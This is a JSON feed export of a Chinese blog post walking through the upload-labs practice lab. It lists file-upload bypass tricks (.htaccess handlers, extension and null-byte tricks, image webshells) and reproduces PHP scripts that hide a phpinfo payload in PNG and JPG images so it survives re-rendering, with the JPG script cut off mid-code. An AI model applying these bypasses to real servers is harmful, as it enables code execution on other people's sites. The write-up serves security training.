{
    "version": "https://jsonfeed.org/version/1",
    "title": "M1N's Blog • All posts by \"文件上传\" category",
    "description": "M1N的博客",
    "home_page_url": "http://blog.m1n.me",
    "items": [
        {
            "id": "http://blog.m1n.me/2019/10/12/upload-labs/",
            "url": "http://blog.m1n.me/2019/10/12/upload-labs/",
            "title": "upload-labs",
            "date_published": "2019-10-12T02:48:24.000Z",
            "content_html": "<p>emmmm</p>\n<span id=\"more\"></span>\n<h1 id=\"Less-1\"><a href=\"#Less-1\" class=\"headerlink\" title=\"Less-1\"></a>Less-1</h1><ol>\n<li>前端验证，先将一句话改成jpg，通过前端验证后抓包修改后缀名为php以及修改content-type：application/octet-stream成功上传</li>\n<li>禁用JS直接上传</li>\n</ol>\n<h1 id=\"Less-2\"><a href=\"#Less-2\" class=\"headerlink\" title=\"Less-2\"></a>Less-2</h1><p>这一关检测的是Content-Type: image/jpeg，抓包修改一下就ok</p>\n<h1 id=\"Less-3\"><a href=\"#Less-3\" class=\"headerlink\" title=\"Less-3\"></a>Less-3</h1><p>黑名单绕过，可以上传.phtml等文件绕过，php解释器可以将phpt、php3、4、5、phtml解析成PHP文件，不能解析的后缀会以txt形式展现，但是其中包含的html代码会被浏览器解析，可以执行JS代码</p>\n<h1 id=\"Less-4\"><a href=\"#Less-4\" class=\"headerlink\" title=\"Less-4\"></a>Less-4</h1><p>先上传一个test.phpx文件，再上传.htaccess文件使得它能够被解析来绕过.htaccess内容：</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-section\">&lt;FilesMatch <span class=\"hljs-string\">&quot;test.phpx&quot;</span>&gt;</span><br><br>  <span class=\"hljs-attribute\"><span class=\"hljs-nomarkup\">SetHandler</span></span> application/x-httpd-php<br><br><span class=\"hljs-section\">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure>\n<p>或者：</p>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\">AddType <span class=\"hljs-built_in\">application</span>/x-httpd-php .jpg<br></code></pre></td></tr></table></figure>\n<p>来使得jpg能被解析</p>\n<h1 id=\"Less-5\"><a href=\"#Less-5\" class=\"headerlink\" title=\"Less-5\"></a>Less-5</h1><p>大小写绕过。。。。</p>\n<h1 id=\"Less-6\"><a href=\"#Less-6\" class=\"headerlink\" title=\"Less-6\"></a>Less-6</h1><p>文件名结尾加空格绕过黑名单</p>\n<h1 id=\"Less-7\"><a href=\"#Less-7\" class=\"headerlink\" title=\"Less-7\"></a>Less-7</h1><p>文件结尾加“.”可以被解析</p>\n<h1 id=\"Less-8\"><a href=\"#Less-8\" class=\"headerlink\" title=\"Less-8\"></a>Less-8</h1><p>文件结尾加“::$DATA”,Windows特性</p>\n<h1 id=\"Less-9\"><a href=\"#Less-9\" class=\"headerlink\" title=\"Less-9\"></a>Less-9</h1><p>文件结尾加“.空格.”，最后会变成”.php.”Windows特性</p>\n<h1 id=\"Less-10\"><a href=\"#Less-10\" class=\"headerlink\" title=\"Less-10\"></a>Less-10</h1><p>上传phtmlhp绕过</p>\n<h1 id=\"Less-11\"><a href=\"#Less-11\" class=\"headerlink\" title=\"Less-11\"></a>Less-11</h1><p>上传路径修改成../upload/1.php%00,%00截断。或者尝试1.php/. </p>\n<h1 id=\"Less-12\"><a href=\"#Less-12\" class=\"headerlink\" title=\"Less-12\"></a>Less-12</h1><p>上传路径修改成../upload/1.php+，然后用16进制查看，找到68  70   2b，把2b修改成00然后上传</p>\n<h1 id=\"Less-13\"><a href=\"#Less-13\" class=\"headerlink\" title=\"Less-13\"></a>Less-13</h1><p>要求上传三种格式的图片马，然后用文件包含漏洞执行。jpg格式可以直接用CMD命令<code>copy test.jpg/b test.php/a ma.jpg</code>生成，GIF和PNG格式可以通过Hxd修改正常图片生成，</p>\n<p>其中JPG格式头部<code>FF D8 (FF E0)</code>尾部<code>FF D9</code>PNG格式头部<code>89 50 4E 47 0D 0A 1A 0A</code>GIF格式头部<code>47 49 46 38 39 61</code></p>\n<h1 id=\"Less-14\"><a href=\"#Less-14\" class=\"headerlink\" title=\"Less-14\"></a>Less-14</h1><p>提示用getimagesize()获取图片信息，同样上传图片马即可绕过</p>\n<h1 id=\"Less-15\"><a href=\"#Less-15\" class=\"headerlink\" title=\"Less-15\"></a>Less-15</h1><p>提示本pass使用exif_imagetype()检查是否为图片文件！，绕过方法同上</p>\n<h1 id=\"Less-16\"><a href=\"#Less-16\" class=\"headerlink\" title=\"Less-16\"></a>Less-16</h1><p>提示进行了二次渲染，印象中是某一个区块二次渲染时不会被改变，GIF格式加在尾部的代码会被删除，我找到了中间空白部分，加上phpinfo后就可以执行。</p>\n<p>PNG还有JPG格式的处理方法比较麻烦，用网上的脚本来生成</p>\n<p>PNG:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><br><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-variable\">$p</span> = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-number\">0xa3</span>, <span class=\"hljs-number\">0x9f</span>, <span class=\"hljs-number\">0x67</span>, <span class=\"hljs-number\">0xf7</span>, <span class=\"hljs-number\">0x0e</span>, <span class=\"hljs-number\">0x93</span>, <span class=\"hljs-number\">0x1b</span>, <span class=\"hljs-number\">0x23</span>,<br>           <span class=\"hljs-number\">0xbe</span>, <span class=\"hljs-number\">0x2c</span>, <span class=\"hljs-number\">0x8a</span>, <span class=\"hljs-number\">0xd0</span>, <span class=\"hljs-number\">0x80</span>, <span class=\"hljs-number\">0xf9</span>, <span class=\"hljs-number\">0xe1</span>, <span class=\"hljs-number\">0xae</span>,<br>           <span class=\"hljs-number\">0x22</span>, <span class=\"hljs-number\">0xf6</span>, <span class=\"hljs-number\">0xd9</span>, <span class=\"hljs-number\">0x43</span>, <span class=\"hljs-number\">0x5d</span>, <span class=\"hljs-number\">0xfb</span>, <span class=\"hljs-number\">0xae</span>, <span class=\"hljs-number\">0xcc</span>,<br>           <span class=\"hljs-number\">0x5a</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0xdc</span>, <span class=\"hljs-number\">0x5a</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0xdc</span>, <span class=\"hljs-number\">0xa3</span>, <span class=\"hljs-number\">0x9f</span>,<br>           <span class=\"hljs-number\">0x67</span>, <span class=\"hljs-number\">0xa5</span>, <span class=\"hljs-number\">0xbe</span>, <span class=\"hljs-number\">0x5f</span>, <span class=\"hljs-number\">0x76</span>, <span class=\"hljs-number\">0x74</span>, <span class=\"hljs-number\">0x5a</span>, <span class=\"hljs-number\">0x4c</span>,<br>           <span class=\"hljs-number\">0xa1</span>, <span class=\"hljs-number\">0x3f</span>, <span class=\"hljs-number\">0x7a</span>, <span class=\"hljs-number\">0xbf</span>, <span class=\"hljs-number\">0x30</span>, <span class=\"hljs-number\">0x6b</span>, <span class=\"hljs-number\">0x88</span>, <span class=\"hljs-number\">0x2d</span>,<br>           <span class=\"hljs-number\">0x60</span>, <span class=\"hljs-number\">0x65</span>, <span class=\"hljs-number\">0x7d</span>, <span class=\"hljs-number\">0x52</span>, <span class=\"hljs-number\">0x9d</span>, <span class=\"hljs-number\">0xad</span>, <span class=\"hljs-number\">0x88</span>, <span class=\"hljs-number\">0xa1</span>,<br>           <span class=\"hljs-number\">0x66</span>, <span class=\"hljs-number\">0x44</span>, <span class=\"hljs-number\">0x50</span>, <span class=\"hljs-number\">0x33</span>);<br><br><br><br><span class=\"hljs-variable\">$img</span> = imagecreatetruecolor(<span class=\"hljs-number\">32</span>, <span class=\"hljs-number\">32</span>);<br><br><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-variable\">$y</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$y</span> &lt; sizeof(<span class=\"hljs-variable\">$p</span>); <span class=\"hljs-variable\">$y</span> += <span class=\"hljs-number\">3</span>) &#123;<br>   <span class=\"hljs-variable\">$r</span> = <span class=\"hljs-variable\">$p</span>[<span class=\"hljs-variable\">$y</span>];<br>   <span class=\"hljs-variable\">$g</span> = <span class=\"hljs-variable\">$p</span>[<span class=\"hljs-variable\">$y</span>+<span class=\"hljs-number\">1</span>];<br>   <span class=\"hljs-variable\">$b</span> = <span class=\"hljs-variable\">$p</span>[<span class=\"hljs-variable\">$y</span>+<span class=\"hljs-number\">2</span>];<br>   <span class=\"hljs-variable\">$color</span> = imagecolorallocate(<span class=\"hljs-variable\">$img</span>, <span class=\"hljs-variable\">$r</span>, <span class=\"hljs-variable\">$g</span>, <span class=\"hljs-variable\">$b</span>);<br>   imagesetpixel(<span class=\"hljs-variable\">$img</span>, round(<span class=\"hljs-variable\">$y</span> / <span class=\"hljs-number\">3</span>), <span class=\"hljs-number\">0</span>, <span class=\"hljs-variable\">$color</span>);<br>&#125;<br><br>imagepng(<span class=\"hljs-variable\">$img</span>,<span class=\"hljs-string\">&#x27;./1.png&#x27;</span>);<br><span class=\"hljs-meta\">?&gt;</span><br>​```<br></code></pre></td></tr></table></figure>\n\n<p>JPG:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>    <span class=\"hljs-comment\">/*</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class=\"hljs-comment\">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    1) Upload an arbitrary image via secured files upload script</span><br><span class=\"hljs-comment\">    2) Save the processed image and launch:</span><br><span class=\"hljs-comment\">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class=\"hljs-comment\">    1) After the second processing the injected data may become partially corrupted.</span><br><span class=\"hljs-comment\">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class=\"hljs-comment\">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    Sergey Bobrov <span class=\"hljs-doctag\">@Black</span>2Fan.</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    See also:</span><br><span class=\"hljs-comment\">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    */</span><br><br>    <span class=\"hljs-variable\">$miniPayload</span> = <span class=\"hljs-string\">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;<br><br><br>    <span class=\"hljs-keyword\">if</span>(!extension_loaded(<span class=\"hljs-string\">&#x27;gd&#x27;</span>) || !function_exists(<span class=\"hljs-string\">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;php-gd is not installed&#x27;</span>);<br>    &#125;<br><br>    <span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$argv</span>[<span class=\"hljs-number\">1</span>])) &#123;<br>        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>    &#125;<br><br>    set_error_handler(<span class=\"hljs-string\">&quot;custom_error_handler&quot;</span>);<br><br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-variable\">$pad</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$pad</span> &lt; <span class=\"hljs-number\">1024</span>; <span class=\"hljs-variable\">$pad</span>++) &#123;<br>        <span class=\"hljs-variable\">$nullbytePayloadSize</span> = <span class=\"hljs-variable\">$pad</span>;<br>        <span class=\"hljs-variable\">$dis</span> = <span class=\"hljs-keyword\">new</span> DataInputStream(<span class=\"hljs-variable\">$argv</span>[<span class=\"hljs-number\">1</span>]);<br>        <span class=\"hljs-variable\">$outStream</span> = file_get_contents(<span class=\"hljs-variable\">$argv</span>[<span class=\"hljs-number\">1</span>]);<br>        <span class=\"hljs-variable\">$extraBytes</span> = <span class=\"hljs-number\">0</span>;<br>        <span class=\"hljs-variable\">$correctImage</span> = <span class=\"hljs-literal\">TRUE</span>;<br><br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$dis</span>-&gt;readShort() != <span class=\"hljs-number\">0xFFD8</span>) &#123;<br>            <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;Incorrect SOI marker&#x27;</span>);<br>        &#125;<br><br>        <span class=\"hljs-keyword\">while</span>((!<span class=\"hljs-variable\">$dis</span>-&gt;eof()) &amp;&amp; (<span class=\"hljs-variable\">$dis</span>-&gt;readByte() == <span class=\"hljs-number\">0xFF</span>)) &#123;<br>            <span class=\"hljs-variable\">$marker</span> = <span class=\"hljs-variable\">$dis</span>-&gt;readByte();<br>            <span class=\"hljs-variable\">$size</span> = <span class=\"hljs-variable\">$dis</span>-&gt;readShort() - <span class=\"hljs-number\">2</span>;<br>            <span class=\"hljs-variable\">$dis</span>-&gt;skip(<span class=\"hljs-variable\">$size</span>);<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$marker</span> === <span class=\"hljs-number\">0xDA</span>) &#123;<br>                <span class=\"hljs-variable\">$startPos</span> = <span class=\"hljs-variable\">$dis</span>-&gt;seek();<br>                <span class=\"hljs-variable\">$outStreamTmp</span> = <br>                    substr(<span class=\"hljs-variable\">$outStream</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-variable\">$startPos</span>) . <br>                    <span class=\"hljs-variable\">$miniPayload</span> . <br>                    str_repeat(<span class=\"hljs-string\">&quot;\\0&quot;</span>,<span class=\"hljs-variable\">$nullbytePayloadSize</span>) . <br>                    substr(<span class=\"hljs-variable\">$outStream</span>, <span class=\"hljs-variable\">$startPos</span>);<br>                checkImage(<span class=\"hljs-string\">&#x27;_&#x27;</span>.<span class=\"hljs-variable\">$argv</span>[<span class=\"hljs-number\">1</span>], <span class=\"hljs-variable\">$outStreamTmp</span>, <span class=\"hljs-literal\">TRUE</span>);<br>                <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$extraBytes</span> !== <span class=\"hljs-number\">0</span>) &#123;<br>                    <span class=\"hljs-keyword\">while</span>((!<span class=\"hljs-variable\">$dis</span>-&gt;eof())) &#123;<br>                        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$dis</span>-&gt;readByte() === <span class=\"hljs-number\">0xFF</span>) &#123;<br>                            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$dis</span>-&gt;readByte !== <span class=\"hljs-number\">0x00</span>) &#123;<br>                                <span class=\"hljs-keyword\">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                    <span class=\"hljs-variable\">$stopPos</span> = <span class=\"hljs-variable\">$dis</span>-&gt;seek() - <span class=\"hljs-number\">2</span>;<br>                    <span class=\"hljs-variable\">$imageStreamSize</span> = <span class=\"hljs-variable\">$stopPos</span> - <span class=\"hljs-variable\">$startPos</span>;<br>                    <span class=\"hljs-variable\">$outStream</span> = <br>                        substr(<span class=\"hljs-variable\">$outStream</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-variable\">$startPos</span>) . <br>                        <span class=\"hljs-variable\">$miniPayload</span> . <br>                        substr(<br>                            str_repeat(<span class=\"hljs-string\">&quot;\\0&quot;</span>,<span class=\"hljs-variable\">$nullbytePayloadSize</span>).<br>                                substr(<span class=\"hljs-variable\">$outStream</span>, <span class=\"hljs-variable\">$startPos</span>, <span class=\"hljs-variable\">$imageStreamSize</span>),<br>                            <span class=\"hljs-number\">0</span>,<br>                            <span class=\"hljs-variable\">$nullbytePayloadSize</span>+<span class=\"hljs-variable\">$imageStreamSize</span>-<span class=\"hljs-variable\">$extraBytes</span>) . <br>                                substr(<span class=\"hljs-variable\">$outStream</span>, <span class=\"hljs-variable\">$stopPos</span>);<br>                &#125; <span class=\"hljs-keyword\">elseif</span>(<span class=\"hljs-variable\">$correctImage</span>) &#123;<br>                    <span class=\"hljs-variable\">$outStream</span> = <span class=\"hljs-variable\">$outStreamTmp</span>;<br>                &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>                    <span class=\"hljs-keyword\">break</span>;<br>                &#125;<br>                <span class=\"hljs-keyword\">if</span>(checkImage(<span class=\"hljs-string\">&#x27;payload_&#x27;</span>.<span class=\"hljs-variable\">$argv</span>[<span class=\"hljs-number\">1</span>], <span class=\"hljs-variable\">$outStream</span>)) &#123;<br>                    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;Success!&#x27;</span>);<br>                &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>                    <span class=\"hljs-keyword\">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    unlink(<span class=\"hljs-string\">&#x27;payload_&#x27;</span>.<span class=\"hljs-variable\">$argv</span>[<span class=\"hljs-number\">1</span>]);<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;Something\\&#x27;s wrong&#x27;</span>);<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">checkImage</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$filename</span>, <span class=\"hljs-variable\">$data</span>, <span class=\"hljs-variable\">$unlink</span> = <span class=\"hljs-literal\">FALSE</span></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">global</span> <span class=\"hljs-variable\">$correctImage</span>;<br>        file_put_contents(<span class=\"hljs-variable\">$filename</span>, <span class=\"hljs-variable\">$data</span>);<br>        <span class=\"hljs-variable\">$correctImage</span> = <span class=\"hljs-literal\">TRUE</span>;<br>        imagecreatefromjpeg(<span class=\"hljs-variable\">$filename</span>);<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$unlink</span>)<br>            unlink(<span class=\"hljs-variable\">$filename</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$correctImage</span>;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">custom_error_handler</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$errno</span>, <span class=\"hljs-variable\">$errstr</span>, <span class=\"hljs-variable\">$errfile</span>, <span class=\"hljs-variable\">$errline</span></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">global</span> <span class=\"hljs-variable\">$extraBytes</span>, <span class=\"hljs-variable\">$correctImage</span>;<br>        <span class=\"hljs-variable\">$correctImage</span> = <span class=\"hljs-literal\">FALSE</span>;<br>        <span class=\"hljs-keyword\">if</span>(preg_match(<span class=\"hljs-string\">&#x27;/(\\d+) extraneous bytes before marker/&#x27;</span>, <span class=\"hljs-variable\">$errstr</span>, <span class=\"hljs-variable\">$m</span>)) &#123;<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$m</span>[<span class=\"hljs-number\">1</span>])) &#123;<br>                <span class=\"hljs-variable\">$extraBytes</span> = (<span class=\"hljs-keyword\">int</span>)<span class=\"hljs-variable\">$m</span>[<span class=\"hljs-number\">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">DataInputStream</span> </span>&#123;<br>        <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$binData</span>;<br>        <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$order</span>;<br>        <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$size</span>;<br><br>        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$filename</span>, <span class=\"hljs-variable\">$order</span> = <span class=\"hljs-literal\">false</span>, <span class=\"hljs-variable\">$fromString</span> = <span class=\"hljs-literal\">false</span></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;binData = <span class=\"hljs-string\">&#x27;&#x27;</span>;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;order = <span class=\"hljs-variable\">$order</span>;<br>            <span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-variable\">$fromString</span>) &#123;<br>                <span class=\"hljs-keyword\">if</span>(!file_exists(<span class=\"hljs-variable\">$filename</span>) || !is_file(<span class=\"hljs-variable\">$filename</span>))<br>                    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;File not exists [&#x27;</span>.<span class=\"hljs-variable\">$filename</span>.<span class=\"hljs-string\">&#x27;]&#x27;</span>);<br>                <span class=\"hljs-keyword\">$this</span>-&gt;binData = file_get_contents(<span class=\"hljs-variable\">$filename</span>);<br>            &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>                <span class=\"hljs-keyword\">$this</span>-&gt;binData = <span class=\"hljs-variable\">$filename</span>;<br>            &#125;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;size = strlen(<span class=\"hljs-keyword\">$this</span>-&gt;binData);<br>        &#125;<br><br>        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">seek</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">return</span> (<span class=\"hljs-keyword\">$this</span>-&gt;size - strlen(<span class=\"hljs-keyword\">$this</span>-&gt;binData));<br>        &#125;<br><br>        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">skip</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$skip</span></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;binData = substr(<span class=\"hljs-keyword\">$this</span>-&gt;binData, <span class=\"hljs-variable\">$skip</span>);<br>        &#125;<br><br>        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">readByte</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;eof()) &#123;<br>                <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class=\"hljs-variable\">$byte</span> = substr(<span class=\"hljs-keyword\">$this</span>-&gt;binData, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">1</span>);<br>            <span class=\"hljs-keyword\">$this</span>-&gt;binData = substr(<span class=\"hljs-keyword\">$this</span>-&gt;binData, <span class=\"hljs-number\">1</span>);<br>            <span class=\"hljs-keyword\">return</span> ord(<span class=\"hljs-variable\">$byte</span>);<br>        &#125;<br><br>        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">readShort</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">if</span>(strlen(<span class=\"hljs-keyword\">$this</span>-&gt;binData) &lt; <span class=\"hljs-number\">2</span>) &#123;<br>                <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class=\"hljs-variable\">$short</span> = substr(<span class=\"hljs-keyword\">$this</span>-&gt;binData, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">2</span>);<br>            <span class=\"hljs-keyword\">$this</span>-&gt;binData = substr(<span 